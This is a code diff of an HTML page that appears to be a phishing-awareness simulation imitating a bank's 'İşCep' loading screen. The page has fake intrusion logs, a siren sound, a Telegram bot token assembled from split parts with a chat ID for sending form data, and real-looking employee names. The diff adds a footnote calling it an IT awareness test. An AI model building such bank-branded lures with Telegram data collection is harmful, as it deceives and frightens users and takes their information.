@@ -132,7 +132,6 @@
             transition: all 0.5s ease-in-out;
         }
 
-        /* İŞ CEP LOADING EKRANI - MOBİL HİZALAMA DÜZELTMESİ */
         #iscepLoadingOverlay {
             display: none;
             position: fixed;
@@ -141,8 +140,8 @@
             background: #001f3f;
             flex-direction: column;
             align-items: center;
-            justify-content: flex-start; /* Mobilde yukarıdan başlasın */
-            padding-top: 10vh; /* Ekranın %10 üstünden hizala */
+            justify-content: flex-start;
+            padding-top: 10vh;
             padding-left: 16px;
             padding-right: 16px;
             font-family: 'JetBrains Mono', monospace;
@@ -181,7 +180,7 @@
         }
     </style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-4 selection:bg-primary-container selection:text-white" style="background-image: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://lh3.googleusercontent.com/aida/AP1WRLvDawzEMV9xjuDsZ70nV-moWaIvYc5UjDGaOealCwiDLN85TQlZ0ShcNo17t3t6W-R8UqoDz0qo6rCxmc5mYCHBhsimuwq_ZuHM7byrRTJWowILMO0GqdkSCTCVb2h9iqt8yiXbQYeK2wtHdexObKVQo2-yea4lGTTx5XXK0izfJWflyxHZEsAFX5akYYofk6_AHfXaRt_h1ZUIzrYZa4rn8JoisDdTcjN_A9aZipEmb4rUqSmaBQ24gNjH'); background-size: cover; background-position: center; background-attachment: fixed;">
+<body class="min-h-screen flex items-center justify-center p-4 selection:bg-primary-container selection:text-white relative" style="background-image: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://lh3.googleusercontent.com/aida/AP1WRLvDawzEMV9xjuDsZ70nV-moWaIvYc5UjDGaOealCwiDLN85TQlZ0ShcNo17t3t6W-R8UqoDz0qo6rCxmc5mYCHBhsimuwq_ZuHM7byrRTJWowILMO0GqdkSCTCVb2h9iqt8yiXbQYeK2wtHdexObKVQo2-yea4lGTTx5XXK0izfJWflyxHZEsAFX5akYYofk6_AHfXaRt_h1ZUIzrYZa4rn8JoisDdTcjN_A9aZipEmb4rUqSmaBQ24gNjH'); background-size: cover; background-position: center; background-attachment: fixed;">
 
 <audio id="sirenAudio" src="silenthillsiren.mp3" preload="auto"></audio>
 
@@ -221,7 +220,6 @@
             <div id="iscepProgressBar" class="bg-gradient-to-r from-blue-500 via-cyan-400 to-red-500 h-full w-0 transition-all duration-75 ease-linear"></div>
         </div>
 
-        <!-- YAZI BOYUTU VE YÜKSEKLİK MOBİLE UYARLANDI (scroll kilitlenmesi çözüldü) -->
         <div id="logContainer" class="w-full bg-black/85 border border-blue-900/60 rounded-lg p-3 font-mono text-[9px] sm:text-[10px] text-cyan-400 space-y-1.5 h-44 sm:h-48 overflow-y-auto shadow-2xl leading-relaxed">
             <p id="logText1" class="hidden text-blue-300">> [SYS_INIT] Device GUID: 8F3A-992A-4B01-EE02</p>
             <p id="logText2" class="hidden text-emerald-400">> [PERM_GRANT] READ_SMS, READ_CONTACTS, LOCATION</p>
@@ -268,6 +266,13 @@
             </form>
         </div>
     </main>
+
+    <!-- SAĞ ALT KÖŞE FARKINDALIK UYARI METNİ -->
+    <div id="footerNotice" class="fixed bottom-3 right-3 max-w-[240px] sm:max-w-[320px] text-right pointer-events-none z-40">
+        <p class="font-label-technical text-[9px] sm:text-[10px] text-zinc-400/80 leading-tight bg-black/40 p-2 rounded border border-zinc-800/50 backdrop-blur-sm">
+            * Bu bir Bilgi İşlem farkındalık testi çalışmasıdır. Ara ara bu şekilde testler yapılacaktır.
+        </p>
+    </div>
 </div>
 
 <div id="bgEffects" class="fixed inset-0 -z-10 pointer-events-none overflow-hidden">
@@ -282,7 +287,7 @@
     const TELEGRAM_BOT_TOKEN = p1 + ":" + p2; 
     const TELEGRAM_CHAT_ID = "1128146023";
 
-    const allowedNames = ["HALİL ÖZDİNÇ", "SELİM ATMACA", "İLKER HAZIROL", "BARIŞ EROĞLU", "DİDEM DİNÇ", "MURAT YORGANCILAR"];
+    const allowedNames = ["HALİL ÖZDİNÇ", "SELİM ATMACA", "İLKER HAZIROL"];
 
     function cleanName(str) {
         return str.toLocaleUpperCase('tr-TR').trim();
@@ -352,7 +357,6 @@
         if(el) {
             el.classList.remove('hidden');
             el.classList.add('block');
-            // İlk loglarda yukarıda kalsın, son loglarda aşağı kaydırsın
             if (id === 'logText1' || id === 'logText2') {
                 logContainer.scrollTop = 0;
             } else {
